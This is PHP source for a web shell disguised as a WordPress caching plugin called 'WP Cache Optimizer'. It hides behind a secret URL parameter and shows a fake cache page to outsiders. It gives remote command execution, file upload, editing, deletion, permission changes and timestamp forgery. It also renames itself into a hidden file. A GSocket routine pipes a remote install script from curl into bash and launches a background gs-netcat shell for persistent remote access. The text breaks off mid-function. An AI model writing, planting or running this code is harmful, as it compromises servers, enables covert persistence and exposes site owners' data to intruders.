<?php
/**
 * Plugin Name: WP Cache Optimizer
 * Description: WordPress cache management system
 * Version: 3.0
 * Author: WP Core Team
 */

// ============================================================
// CORE SYSTEM - SEMUA FITUR TETAP ADA
// ============================================================
@ignore_user_abort(true);
@ini_set('zlib.output_compression', '0');
@ob_end_clean();

// ============================================================
// KONFIGURASI
// ============================================================
try {
    error_reporting(0);
    ini_set('display_errors', 0);
    ini_set('log_errors', 1);
    
    $session_name = 'wp_' . substr(md5(($_SERVER['HTTP_HOST'] ?? 'localhost') . __FILE__), 0, 10);
    @session_name($session_name);
    
    if (session_status() === PHP_SESSION_NONE) {
        @session_start();
    }
    
    @set_time_limit(300);
    @ini_set('max_execution_time', 300);
    @ini_set('memory_limit', '256M');
    @ini_set('post_max_size', '100M');
    @ini_set('upload_max_filesize', '100M');
    
} catch (Exception $e) {}

// ============================================================
// ACCESS CONTROL - HANYA PARAMETER ?lee=30
// ============================================================
$valid_access = false;
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$secret = md5('wp_cache_' . $host);
$cookie_name = 'wp_' . substr(md5($host), 0, 8);

// HANYA PARAMETER lee=30
if (isset($_GET['bikini']) && $_GET['bikini'] === '1') {
    $valid_access = true;
    if (!headers_sent()) {
        @setcookie($cookie_name, $secret, time() + 86400 * 30, '/');
    }
}

if (!$valid_access && isset($_COOKIE[$cookie_name]) && $_COOKIE[$cookie_name] === $secret) {
    $valid_access = true;
}

if (!$valid_access) {
    if (!headers_sent()) {
        header('Content-Type: text/plain');
        header('X-Robots-Tag: noindex, nofollow');
    }
    echo "# WordPress cache file\n";
    echo "# Generated: " . date('Y-m-d H:i:s') . "\n";
    echo "<?php exit; ?>\n";
    exit;
}

// ============================================================
// FUNGSI UTILITY - LENGKAP
// ============================================================
if (!function_exists('wp_format_size')) {
    function wp_format_size($bytes, $precision = 2) {
        if (!is_numeric($bytes) || $bytes <= 0) return '0 B';
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $base = log($bytes, 1024);
        $pow = floor($base);
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, $precision) . ' ' . $units[$pow];
    }
}

if (!function_exists('wp_get_perm')) {
    function wp_get_perm($path) {
        $default = ['unix' => '---------', 'octal' => '0000', 'writable' => false];
        if (!file_exists($path)) return $default;
        
        $perms = fileperms($path);
        if ($perms === false) return $default;
        
        $unix = (is_dir($path)) ? 'd' : '-';
        $unix .= ($perms & 0x0100) ? 'r' : '-';
        $unix .= ($perms & 0x0080) ? 'w' : '-';
        $unix .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
        $unix .= ($perms & 0x0020) ? 'r' : '-';
        $unix .= ($perms & 0x0010) ? 'w' : '-';
        $unix .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
        $unix .= ($perms & 0x0004) ? 'r' : '-';
        $unix .= ($perms & 0x0002) ? 'w' : '-';
        $unix .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
        
        $octal = substr(sprintf('%o', $perms), -4);
        $is_writable = is_writable($path);
        
        return ['unix' => $unix, 'octal' => $octal, 'writable' => $is_writable];
    }
}

function wp_get_current_dir() {
    static $dir = null;
    if ($dir === null) {
        $candidates = [];
        if (isset($_GET['p']) && is_string($_GET['p'])) {
            $candidates[] = $_GET['p'];
        }
        
        $cwd = @getcwd();
        if ($cwd !== false) $candidates[] = $cwd;
        
        $candidates[] = dirname(__FILE__);
        
        $realpath = @realpath('.');
        if ($realpath !== false) $candidates[] = $realpath;
        
        foreach ($candidates as $candidate) {
            if ($candidate && @is_dir($candidate) && @is_readable($candidate)) {
                $dir = $candidate;
                break;
            }
        }
        if (!$dir) $dir = '.';
    }
    return $dir;
}

function wp_is_hidden($filename) {
    return strpos(basename($filename), '.') === 0;
}

function wp_hide_self($filename) {
    $hidden = '.' . basename($filename);
    $hidden_path = dirname($filename) . '/' . $hidden;
    if (@rename($filename, $hidden_path)) {
        return $hidden_path;
    }
    return $filename;
}

// ============================================================
// FUNGSI UPLOAD - ENHANCED
// ============================================================
function wp_upload_file($tmp, $target, $name) {
    $result = ['success' => false, 'method' => ''];
    
    if (empty($tmp) || !file_exists($tmp)) {
        return $result;
    }
    
    if (is_uploaded_file($tmp)) {
        if (@move_uploaded_file($tmp, $target)) {
            @chmod($target, 0644);
            $result['success'] = true;
            $result['method'] = 'move';
            return $result;
        }
    }
    
    if (@copy($tmp, $target)) {
        @chmod($target, 0644);
        @unlink($tmp);
        $result['success'] = true;
        $result['method'] = 'copy';
        return $result;
    }
    
    $content = @file_get_contents($tmp);
    if ($content !== false && @file_put_contents($target, $content) !== false) {
        @chmod($target, 0644);
        $result['success'] = true;
        $result['method'] = 'write';
        return $result;
    }
    
    $src = @fopen($tmp, 'rb');
    $dst = @fopen($target, 'wb');
    if ($src && $dst) {
        $ok = true;
        while (!feof($src)) {
            $chunk = @fread($src, 8192);
            if ($chunk === false || @fwrite($dst, $chunk) === false) {
                $ok = false;
                break;
            }
        }
        @fclose($src); @fclose($dst);
        if ($ok) {
            @chmod($target, 0644);
            $result['success'] = true;
            $result['method'] = 'stream';
            return $result;
        }
    }
    
    return $result;
}

// ============================================================
// FUNGSI CREATE - ENHANCED
// ============================================================
function wp_create_item($path, $type, $content = '') {
    $result = ['success' => false, 'method' => ''];
    
    if ($type === 'folder') {
        if (@mkdir($path, 0755, true)) {
            $result['success'] = true;
            $result['method'] = 'mkdir';
            return $result;
        }
        if (@mkdir($path, 0777, true)) {
            $result['success'] = true;
            $result['method'] = 'mkdir_wide';
            return $result;
        }
        if (function_exists('shell_exec') && !ini_get('safe_mode')) {
            @shell_exec('mkdir -p ' . escapeshellarg($path) . ' 2>&1');
            if (@is_dir($path)) {
                $result['success'] = true;
                $result['method'] = 'shell_mkdir';
                return $result;
            }
        }
        $parent = dirname($path);
        if (!is_dir($parent)) {
            wp_create_item($parent, 'folder', '');
            return wp_create_item($path, $type, $content);
        }
    } else {
        if (@file_put_contents($path, $content) !== false) {
            @chmod($path, 0644);
            $result['success'] = true;
            $result['method'] = 'write';
            return $result;
        }
        $fp = @fopen($path, 'w');
        if ($fp) {
            if (@fwrite($fp, $content) !== false) {
                @fclose($fp);
                @chmod($path, 0644);
                $result['success'] = true;
                $result['method'] = 'fwrite';
                return $result;
            }
            @fclose($fp);
        }
        if (function_exists('shell_exec') && !ini_get('safe_mode')) {
            $escaped = addslashes($content);
            @shell_exec('echo "' . $escaped . '" > ' . escapeshellarg($path) . ' 2>&1');
            if (file_exists($path)) {
                $result['success'] = true;
                $result['method'] = 'shell_echo';
                return $result;
            }
        }
    }
    return $result;
}

// ============================================================
// FUNGSI WRITE FILE - ENHANCED
// ============================================================
function wp_write_file($path, $content) {
    $result = ['success' => false, 'method' => ''];
    
    if (@file_put_contents($path, $content) !== false) {
        $result['success'] = true;
        $result['method'] = 'write';
        return $result;
    }
    
    $fp = @fopen($path, 'w');
    if ($fp) {
        if (@fwrite($fp, $content) !== false) {
            @fclose($fp);
            $result['success'] = true;
            $result['method'] = 'fwrite';
            return $result;
        }
        @fclose($fp);
    }
    
    if (@file_put_contents($path, $content, LOCK_EX) !== false) {
        $result['success'] = true;
        $result['method'] = 'lock';
        return $result;
    }
    
    if (function_exists('shell_exec') && !ini_get('safe_mode')) {
        $escaped = addslashes($content);
        @shell_exec('echo "' . $escaped . '" > ' . escapeshellarg($path) . ' 2>&1');
        if (file_exists($path)) {
            $result['success'] = true;
            $result['method'] = 'shell_echo';
            return $result;
        }
    }
    
    return $result;
}

// ============================================================
// FUNGSI MKDIR - ENHANCED
// ============================================================
function wp_mkdir_recursive($path, $perms = 0755) {
    if (@is_dir($path)) return true;
    if (@mkdir($path, $perms, true)) return true;
    if (@mkdir($path, 0777, true)) return true;
    
    $parent = dirname($path);
    if (!@is_dir($parent)) {
        if (wp_mkdir_recursive($parent, $perms)) {
            if (@mkdir($path, $perms)) return true;
        }
    }
    
    if (function_exists('shell_exec') && !ini_get('safe_mode')) {
        @shell_exec('mkdir -p ' . escapeshellarg($path) . ' 2>&1');
        if (@is_dir($path)) return true;
    }
    
    $old = umask(0);
    $result = @mkdir($path, $perms);
    umask($old);
    if ($result) return true;
    
    return false;
}

// ============================================================
// FUNGSI EXECUTE - DENGAN KEAMANAN
// ============================================================
function wp_execute($cmd, $cwd = null) {
    $dangerous = ['rm -rf /', 'dd if=', 'mkfs', 'fork bomb', ':(){', 'chmod 777 /', 'chown -R'];
    foreach ($dangerous as $d) {
        if (stripos($cmd, $d) !== false) {
            return "⛔ Command blocked for security";
        }
    }
    
    if (empty($cmd) || !is_string($cmd)) {
        return "⛔ Invalid command";
    }
    
    $dir = $cwd ?: wp_get_current_dir();
    $full = 'cd "' . addslashes($dir) . '" && ' . $cmd . ' 2>&1';
    $output = '';
    
    if (function_exists('shell_exec') && !ini_get('safe_mode')) {
        $output = @shell_exec($full);
        if ($output !== null && $output !== false && trim($output) !== '') {
            return "✅ " . $cmd . "\n" . $output;
        }
    }
    
    if (function_exists('exec')) {
        @exec($full, $out, $code);
        if (!empty($out)) {
            $output = implode("\n", $out);
            if ($code === 0 && trim($output) !== '') {
                return "✅ " . $cmd . "\n" . $output;
            }
        }
    }
    
    if (function_exists('passthru')) {
        ob_start();
        @passthru($full, $code);
        $output = ob_get_clean();
        if ($code === 0 && !empty($output)) {
            return "✅ " . $cmd . "\n" . $output;
        }
    }
    
    if (function_exists('system')) {
        ob_start();
        @system($full, $code);
        $output = ob_get_clean();
        if ($code === 0 && !empty($output)) {
            return "✅ " . $cmd . "\n" . $output;
        }
    }
    
    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = @proc_open($full, $descriptors, $pipes);
        if (is_resource($process)) {
            @fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            @fclose($pipes[1]); @fclose($pipes[2]);
            $return = proc_close($process);
            $result = trim($stdout) . (!empty($stderr) ? "\n[STDERR]: " . trim($stderr) : '');
            if ($return === 0 && !empty($result)) {
                return "✅ " . $cmd . "\n" . $result;
            }
        }
    }
    
    if (preg_match('/^ls\s*(.+)?$/i', $cmd, $m)) {
        $path = isset($m[1]) ? trim($m[1]) : '.';
        $full_path = $dir . '/' . ltrim($path, '/');
        if (is_dir($full_path)) {
            $files = @scandir($full_path);
            if ($files !== false) {
                $output = implode("\n", array_diff($files, ['.', '..']));
                if (!empty($output)) {
                    return "✅ " . $cmd . "\n" . $output;
                }
            }
        }
    }
    
    if (preg_match('/^pwd$/i', $cmd)) {
        return "✅ " . $cmd . "\n" . $dir;
    }
    
    if (preg_match('/^php\s+-v$/i', $cmd)) {
        return "✅ " . $cmd . "\nPHP: " . phpversion();
    }
    
    if (preg_match('/^whoami$/i', $cmd)) {
        $user = function_exists('get_current_user') ? get_current_user() : 'unknown';
        return "✅ " . $cmd . "\n" . $user;
    }
    
    return !empty($output) ? "❌ " . $cmd . "\n" . $output : "❌ No output";
}

// ============================================================
// FUNGSI DOWNLOAD - ENHANCED
// ============================================================
function wp_download_file($cmd, $path) {
    $result = ['success' => false, 'output' => '', 'method' => ''];
    
    if (empty($cmd) || !is_string($cmd)) {
        $result['output'] = "❌ Invalid command";
        return $result;
    }
    
    if (preg_match('/^(wget|curl)\s+(?:-O\s+(\S+)\s+)?(https?:\/\/\S+)/i', $cmd, $m)) {
        $url = isset($m[3]) ? $m[3] : (isset($m[2]) ? $m[2] : '');
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            $result['output'] = "❌ Invalid URL";
            return $result;
        }
    }
    
    if (preg_match('/^wget\s+(?:-O\s+(\S+)\s+)?(https?:\/\/\S+)/i', $cmd, $m)) {
        $url = isset($m[2]) ? $m[2] : $m[1];
        $filename = (isset($m[1]) && $m[1] != $url) ? $m[1] : basename(parse_url($url, PHP_URL_PATH));
        if (empty($filename)) $filename = 'file_' . time() . '.bin';
        $target = rtrim($path, '/') . '/' . $filename;
        
        if (function_exists('shell_exec') && !ini_get('safe_mode')) {
            $full = 'cd "' . addslashes($path) . '" && wget ' . escapeshellarg($url) . ' -O ' . escapeshellarg($filename) . ' 2>&1';
            $out = @shell_exec($full);
            if (file_exists($target) && filesize($target) > 0) {
                $result['success'] = true;
                $result['output'] = "✅ Download: $filename (" . wp_format_size(filesize($target)) . ")\n" . $out;
                $result['method'] = 'wget';
                return $result;
            }
        }
        
        $content = @file_get_contents($url);
        if ($content !== false && @file_put_contents($target, $content) !== false) {
            @chmod($target, 0644);
            $result['success'] = true;
            $result['output'] = "✅ Download: $filename (" . wp_format_size(filesize($target)) . ")";
            $result['method'] = 'php';
            return $result;
        }
    }
    
    if (preg_match('/^curl\s+(?:-o\s+(\S+)\s+)?(https?:\/\/\S+)/i', $cmd, $m)) {
        $url = isset($m[2]) ? $m[2] : $m[1];
        $filename = (isset($m[1]) && $m[1] != $url) ? $m[1] : basename(parse_url($url, PHP_URL_PATH));
        if (empty($filename)) $filename = 'file_' . time() . '.bin';
        $target = rtrim($path, '/') . '/' . $filename;
        
        if (function_exists('shell_exec') && !ini_get('safe_mode')) {
            $full = 'cd "' . addslashes($path) . '" && curl -o ' . escapeshellarg($filename) . ' ' . escapeshellarg($url) . ' 2>&1';
            $out = @shell_exec($full);
            if (file_exists($target) && filesize($target) > 0) {
                $result['success'] = true;
                $result['output'] = "✅ Download: $filename (" . wp_format_size(filesize($target)) . ")\n" . $out;
                $result['method'] = 'curl';
                return $result;
            }
        }
        
        $content = @file_get_contents($url);
        if ($content !== false && @file_put_contents($target, $content) !== false) {
            @chmod($target, 0644);
            $result['success'] = true;
            $result['output'] = "✅ Download: $filename (" . wp_format_size(filesize($target)) . ")";
            $result['method'] = 'php';
            return $result;
        }
    }
    
    return $result;
}

// ============================================================
// INIT - SEMUA FITUR DIJAGA
// ============================================================
if (!isset($_SESSION['home_dir'])) {
    $_SESSION['home_dir'] = wp_get_current_dir();
}

$current_dir = isset($_GET['p']) && is_string($_GET['p']) ? $_GET['p'] : wp_get_current_dir();
if (!@is_dir($current_dir)) $current_dir = wp_get_current_dir();
if ($current_dir !== '/' && substr($current_dir, -1) !== '/') $current_dir .= '/';

$messages = [];
$cmd_output = isset($_SESSION['cmd_out']) ? $_SESSION['cmd_out'] : '';
$editing_file = null;
$file_content = '';

if (isset($_SESSION['msg'])) {
    $messages[] = $_SESSION['msg'];
    unset($_SESSION['msg']);
}

if (isset($_GET['edit']) && is_string($_GET['edit'])) {
    $file = basename($_GET['edit']);
    $path = $current_dir . $file;
    if (file_exists($path) && is_file($path) && is_readable($path)) {
        $editing_file = $file;
        $file_content = file_get_contents($path);
    }
}

// ============================================================
// AJAX HANDLER - TERMINAL LIVE
// ============================================================
if (isset($_POST['ajax']) && $_POST['ajax'] == 1) {
    if (!headers_sent()) header('Content-Type: application/json');
    
    $cmd = isset($_POST['cmd']) && is_string($_POST['cmd']) ? $_POST['cmd'] : '';
    $path = isset($_POST['path']) && is_string($_POST['path']) ? $_POST['path'] : $current_dir;
    
    if (empty($cmd)) {
        echo json_encode(['error' => 'No command']);
        exit;
    }
    
    $output = '';
    $method = '';
    
    if (preg_match('/^(wget|curl)\s+/i', $cmd)) {
        $dl = wp_download_file($cmd, $path);
        if ($dl['success']) {
            $output = $dl['output'];
            $method = $dl['method'];
        }
    }
    
    if (empty($output)) {
        $output = wp_execute($cmd, $path);
        if (!empty($output) && strpos($output, 'No output') === false) {
            $method = 'exec';
        }
    }
    
    echo json_encode([
        'status' => (!empty($output) && strpos($output, '❌') === false) ? '✅ SUCCESS' : '❌ FAILED',
        'method' => $method,
        'output' => !empty($output) ? $output : 'No output',
        'cmd' => $cmd,
        'path' => $path,
        'time' => date('Y-m-d H:i:s')
    ]);
    exit;
}

// ============================================================
// POST HANDLER - SEMUA FITUR
// ============================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // ===== UPLOAD MULTIPLE FILE =====
    if (!empty($_FILES['files'])) {
        $ok = [];
        $fail = [];
        $methods = [];
        
        if (is_array($_FILES['files']['name'])) {
            $total = count($_FILES['files']['name']);
            
            for ($i = 0; $i < $total; $i++) {
                if (isset($_FILES['files']['error'][$i]) && $_FILES['files']['error'][$i] === UPLOAD_ERR_OK && 
                    !empty($_FILES['files']['tmp_name'][$i])) {
                    $name = basename($_FILES['files']['name'][$i]);
                    $target = $current_dir . $name;
                    $res = wp_upload_file($_FILES['files']['tmp_name'][$i], $target, $name);
                    
                    if ($res['success']) {
                        $ok[] = $name . " (" . $res['method'] . ")";
                        $methods[] = $res['method'];
                    } else {
                        $fail[] = $name;
                    }
                }
            }
        }
        
        $msg = "";
        if (!empty($ok)) {
            $msg .= "✅ Upload: " . implode(', ', $ok);
        }
        if (!empty($fail)) {
            $msg .= (!empty($msg) ? "\n" : "") . "❌ Failed: " . implode(', ', $fail);
        }
        $_SESSION['msg'] = $msg;
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== GSOCKET - FULL FITUR =====
    if (isset($_POST['gs']) && is_string($_POST['gs'])) {
        $action = $_POST['gs'];
        $output = "";
        
        if ($action == 'install') {
            $output .= "📦 INSTALL GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            $res = wp_execute('bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1', $current_dir);
            $output .= $res . "\n\n";
            $check = wp_execute('which gs-netcat 2>&1', $current_dir);
            $output .= strpos($check, 'gs-netcat') !== false ? "✅ GSOCKET INSTALLED!\n" : "❌ INSTALL FAILED.\n";
        } elseif ($action == 'uninstall') {
            $output .= "🗑️ UNINSTALL GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            $res = wp_execute('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1', $current_dir);
            $output .= $res . "\n\n";
            $output .= "✅ GSOCKET UNINSTALLED!\n";
        } elseif ($action == 'run') {
            $secret = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 16);
            $output .= "🚀 RUN GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            $output .= "🔑 SECRET: $secret\n";
            $output .= "📋 COPY THIS SECRET: $secret\n\n";
            $output .= "💻 Connect: gs-netcat -s \"$secret\" -i\n";
            wp_execute('pkill -f gs-netcat 2>&1', $current_dir);
            wp_execute('nohup gs-netcat -s "' . $secret . '" -i > /dev/null 2>&1 &', $current_dir);
            $output .= "✅ GSOCKET RUNNING IN BACKGROUND!\n";
        } elseif ($action == 'kill') {
            $output .= "🔪 KILL GSOCKET\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
            wp_execute('pkill -f gs-netcat 2>&1', $current_dir);
            $output .= "✅ ALL GSOCKET PROCESSES KILLED!\n";
        }
        
        $_SESSION['cmd_out'] = $output;
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== ZIP UPLOAD & EXTRACT =====
    if (isset($_FILES['zip'])) {
        if ($_FILES['zip']['error'] !== UPLOAD_ERR_OK) {
            $_SESSION['msg'] = "❌ ZIP upload failed";
        } else {
            $name = basename($_FILES['zip']['name']);
            $target = $current_dir . $name;
            
            $is_zip = false;
            $h = @fopen($_FILES['zip']['tmp_name'], 'rb');
            if ($h) {
                $bytes = @fread($h, 4);
                @fclose($h);
                $is_zip = ($bytes === "PK\x03\x04");
            }
            
            if (!$is_zip) {
                $_SESSION['msg'] = "❌ Invalid ZIP file";
            } else {
                $res = wp_upload_file($_FILES['zip']['tmp_name'], $target, $name);
                
                if ($res['success']) {
                    $msg = "✅ ZIP uploaded: $name";
                    $extracted = false;
                    
                    if (class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($target) === TRUE) {
                            if ($zip->extractTo($current_dir)) {
                                $zip->close();
                                $extracted = true;
                                $msg .= " & extracted";
                            } else {
                                $zip->close();
                            }
                        }
                    }
                    
                    if (!$extracted && function_exists('shell_exec') && !ini_get('safe_mode')) {
                        $cmd = 'cd "' . addslashes($current_dir) . '" && unzip -o ' . escapeshellarg($name) . ' 2>&1';
                        $out = @shell_exec($cmd);
                        if (strpos($out, 'inflating:') !== false || strpos($out, 'extracting:') !== false) {
                            $extracted = true;
                            $msg .= " & extracted (shell)";
                        }
                    }
                    
                    if (!$extracted) {
                        $msg .= " (extract manually via button)";
                    }
                    
                    $_SESSION['msg'] = $msg;
                } else {
                    $_SESSION['msg'] = "❌ Failed to upload ZIP";
                }
            }
        }
        
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== CREATE FILE/FOLDER =====
    if (isset($_POST['create'])) {
        if (isset($_POST['name']) && is_string($_POST['name']) && !empty($_POST['name'])) {
            $name = basename($_POST['name']);
            $type = isset($_POST['type']) && $_POST['type'] === 'folder' ? 'folder' : 'file';
            $path = $current_dir . $name;
            $content = isset($_POST['data']) && is_string($_POST['data']) ? $_POST['data'] : '';
            $res = wp_create_item($path, $type, $content);
            $_SESSION['msg'] = $res['success'] ? "✅ Created $type: $name" : "❌ Failed to create $type";
        }
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== COMMAND EXECUTION =====
    if (isset($_POST['cmd']) && is_string($_POST['cmd']) && trim($_POST['cmd']) !== '') {
        $cmd_output = wp_execute($_POST['cmd'], $current_dir);
        $_SESSION['cmd_out'] = $cmd_output;
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== EDIT/SAVE FILE =====
    if (isset($_POST['content']) && isset($_POST['edit_file']) && is_string($_POST['edit_file'])) {
        $target = $current_dir . basename($_POST['edit_file']);
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        $res = wp_write_file($target, $content);
        $_SESSION['msg'] = $res['success'] ? "✅ File saved" : "❌ Failed to save";
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== DELETE SELECTED =====
    if (isset($_POST['delete_selected'])) {
        $items = isset($_POST['selected']) && is_array($_POST['selected']) ? $_POST['selected'] : [];
        $deleted = [];
        $failed = [];
        
        foreach ($items as $item) {
            if (is_string($item)) {
                $target = $current_dir . basename($item);
                if (file_exists($target)) {
                    if (is_dir($target)) {
                        try {
                            $files = new RecursiveIteratorIterator(
                                new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                                RecursiveIteratorIterator::CHILD_FIRST
                            );
                            foreach ($files as $info) {
                                if ($info->isDir()) {
                                    @rmdir($info->getRealPath());
                                } else {
                                    @unlink($info->getRealPath());
                                }
                            }
                            if (@rmdir($target)) $deleted[] = $item;
                            else $failed[] = $item;
                        } catch (Exception $e) {
                            $failed[] = $item;
                        }
                    } else {
                        if (@unlink($target)) $deleted[] = $item;
                        else $failed[] = $item;
                    }
                }
            }
        }
        
        $msg = '';
        if (!empty($deleted)) $msg .= "✅ Deleted: " . implode(', ', $deleted);
        if (!empty($failed)) $msg .= (!empty($msg) ? "\n" : "") . "❌ Failed: " . implode(', ', $failed);
        if (!empty($msg)) $_SESSION['msg'] = $msg;
        
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== DELETE SINGLE =====
    if (isset($_POST['delete_single']) && isset($_POST['delete_file']) && is_string($_POST['delete_file'])) {
        $target = $current_dir . basename($_POST['delete_file']);
        if (file_exists($target)) {
            $ok = false;
            if (is_dir($target)) {
                try {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::CHILD_FIRST
                    );
                    foreach ($files as $info) {
                        if ($info->isDir()) @rmdir($info->getRealPath());
                        else @unlink($info->getRealPath());
                    }
                    $ok = @rmdir($target);
                } catch (Exception $e) {}
            } else {
                $ok = @unlink($target);
            }
            $_SESSION['msg'] = $ok ? "✅ Deleted" : "❌ Failed";
        }
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== CHMOD =====
    if (isset($_POST['chmod']) && isset($_POST['chmod_file']) && is_string($_POST['chmod_file']) && 
        isset($_POST['perms']) && is_string($_POST['perms'])) {
        $target = $current_dir . basename($_POST['chmod_file']);
        $perms = $_POST['perms'];
        if (file_exists($target)) {
            $octal = octdec($perms);
            $_SESSION['msg'] = @chmod($target, $octal) ? "✅ Permissions changed to $perms" : "❌ Failed";
        }
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== TOUCH =====
    if (isset($_POST['touch']) && isset($_POST['touch_file']) && is_string($_POST['touch_file']) && 
        isset($_POST['timestamp']) && is_string($_POST['timestamp'])) {
        $target = $current_dir . basename($_POST['touch_file']);
        $timestamp = $_POST['timestamp'];
        if (file_exists($target)) {
            $time = strtotime($timestamp);
            if ($time !== false) {
                $_SESSION['msg'] = @touch($target, $time) ? "✅ Time changed" : "❌ Failed";
            } else {
                $_SESSION['msg'] = "❌ Invalid timestamp";
            }
        }
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== RENAME =====
    if (isset($_POST['rename']) && isset($_POST['rename_old']) && is_string($_POST['rename_old']) && 
        isset($_POST['rename_new']) && is_string($_POST['rename_new'])) {
        $old = $current_dir . basename($_POST['rename_old']);
        $new = $current_dir . basename($_POST['rename_new']);
        if (file_exists($old)) {
            if (!file_exists($new)) {
                $_SESSION['msg'] = @rename($old, $new) ? "✅ Renamed" : "❌ Failed";
            } else {
                $_SESSION['msg'] = "❌ Target already exists";
            }
        }
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
    
    // ===== HIDE/REVEAL =====
    if (isset($_POST['lock']) && is_string($_POST['lock'])) {
        if ($_POST['lock'] === 'hide') {
            $hidden = wp_hide_self(__FILE__);
            if ($hidden) {
                $new_url = str_replace(basename(__FILE__), basename($hidden), $_SERVER['PHP_SELF']);
                $redirect = $new_url . "?lee=30&p=" . urlencode($current_dir);
                header("Location: " . $redirect);
                exit;
            }
        } elseif ($_POST['lock'] === 'reveal') {
            $current = basename(__FILE__);
            $clean = ltrim($current, '.');
            $revealed = dirname(__FILE__) . '/' . $clean;
            if (@rename(__FILE__, $revealed)) {
                $new_url = str_replace(basename(__FILE__), $clean, $_SERVER['PHP_SELF']);
                $redirect = $new_url . "?lee=30&p=" . urlencode($current_dir);
                header("Location: " . $redirect);
                exit;
            }
        }
    }
    
    // ===== EXTRACT ZIP =====
    if (isset($_POST['extract_zip']) && isset($_POST['zip_file']) && is_string($_POST['zip_file'])) {
        $zip_file = $current_dir . basename($_POST['zip_file']);
        if (file_exists($zip_file)) {
            $extracted = false;
            
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($zip_file) === TRUE) {
                    if ($zip->extractTo($current_dir)) {
                        $extracted = true;
                        $_SESSION['msg'] = "✅ ZIP extracted";
                    }
                    $zip->close();
                }
            }
            
            if (!$extracted && function_exists('shell_exec') && !ini_get('safe_mode')) {
                $cmd = 'cd "' . addslashes($current_dir) . '" && unzip -o ' . escapeshellarg(basename($zip_file)) . ' 2>&1';
                $out = @shell_exec($cmd);
                if (strpos($out, 'inflating:') !== false) {
                    $extracted = true;
                    $_SESSION['msg'] = "✅ ZIP extracted (shell)";
                }
            }
            
            if (!$extracted) {
                $_SESSION['msg'] = "❌ Failed to extract";
            }
        }
        
        $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
        header("Location: " . $redirect);
        exit;
    }
}

// ============================================================
// GET HANDLER
// ============================================================
if (isset($_GET['del']) && is_string($_GET['del'])) {
    $target = $current_dir . basename($_GET['del']);
    if (file_exists($target)) {
        $ok = false;
        if (is_dir($target)) {
            try {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($files as $info) {
                    if ($info->isDir()) @rmdir($info->getRealPath());
                    else @unlink($info->getRealPath());
                }
                $ok = @rmdir($target);
            } catch (Exception $e) {}
        } else {
            $ok = @unlink($target);
        }
        $_SESSION['msg'] = $ok ? "✅ Deleted" : "❌ Failed";
    }
    $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
    header("Location: " . $redirect);
    exit;
}

if (isset($_GET['extract']) && is_string($_GET['extract'])) {
    $target = $current_dir . basename($_GET['extract']);
    if (file_exists($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') {
        $extracted = false;
        
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($target) === TRUE) {
